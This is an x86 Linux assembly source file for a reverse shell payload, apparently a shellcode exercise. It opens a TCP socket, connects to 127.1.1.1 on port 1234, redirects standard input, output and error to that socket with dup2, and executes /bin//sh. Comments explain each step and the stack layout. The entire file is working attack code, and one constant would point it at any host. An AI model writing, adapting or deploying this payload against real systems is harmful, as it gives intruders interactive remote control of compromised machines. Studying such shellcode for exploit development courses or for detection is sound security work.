section .text
    global _start

_start:
    addr: equ 0x0101017F ; = 127.1.1.1 in little endian notation
    port: equ 0xD204 ; = 1234 in little endian notation

    ; Reference: socketcall(int call, unsigned long *args)

    ; Create socket: EAX = socket(AF_INET, SOCK_STREAM, 0)
    ; On success EAX will contain socket file descriptor
    xor ebx, ebx  ; zero out ebx
    mul ebx       ; implicitly zero out eax and edx 
    mov al, 0x66  ; socketcall syscall #
    mov bl, 0x1   ; socket function #
    push edx      ; 3rd arg to socket function
    push byte 0x1 ; SOCK_STREEAM - 2nd arg to socket function
    push byte 0x2 ; 1st arg: socket domain = 2 (AF_INET)
    mov ecx, esp  ; Copy args address to ECX 
    int 0x80
   
    ; Try establishing a connection to a remote host  
    ; EAX = connect(conn_sock, &sockaddr_in, sizeof(sockaddr_in))
    ; EAX will be 0 on success
    xchg edx, eax  ; Save socket fd to edx; eax is all 0s now
    mov al, 0x66   ; socketcall syscall #
    pop ebx        ; Reusing 1st arg of the prev func (2)
    pop esi        ; Trashing 4 bytes from the stack 
    push addr      ; sockaddr_in.sin_addr.s_addr = 127.1.1.1 (4 bytes) 
    push word port ; sockaddr_in.sin_port = 1234 (2 bytes)
    push word bx   ; sin_family = 2 (AF_INET) (2 bytes)
    push byte 16   ; addr_len = 16 (structure size) (we don't care about last 8 bytes)
    push ecx       ; ECX points to right address, no need to set or change it
    push edx       ; Socket fd 
                   ; Stack is now 0x0000000 [0x00000000, 0xd204, 0x0002], 
                   ; 0x00000010, &sockaddr_in, socketfd
    mov ecx, esp   ; Copy listening socket descriptor address to ECX 
    inc ebx        ; connect func # (3)
    int 0x80               
   
    ; Redirect process's stdin/out/err to the incoming socket   
    xchg edx, ebx  ; 1st syscall arg in EBX = outgoing socket fd
    xor ecx, ecx
    mov cl, 2
.next_fd:          ; Redirect all process's fds ot incoming socket fd
    mov al, 0x3f   ; dup2 syscall #
    int 0x80        
    dec ecx         
    jns .next_fd   ; loop until ECX == -1 

    ; Start the shell 
    push edi               ; push some delimiting nulls
    push dword 0x68732f2f  ; push /bin//sh string 
    push dword 0x6e69622f  
    mov ebx, esp           ; 1st syscall arg: program address
    push edi               ; push delimiting nulls 
    mov edx, esp           ; 3rd syscall arg: env vars  
    push ebx               ; Push program address string creating args array
    mov ecx, esp           ; 2nd syscall arg: args
    mov al, 0xb            ; execve syscall #
    int 0x80

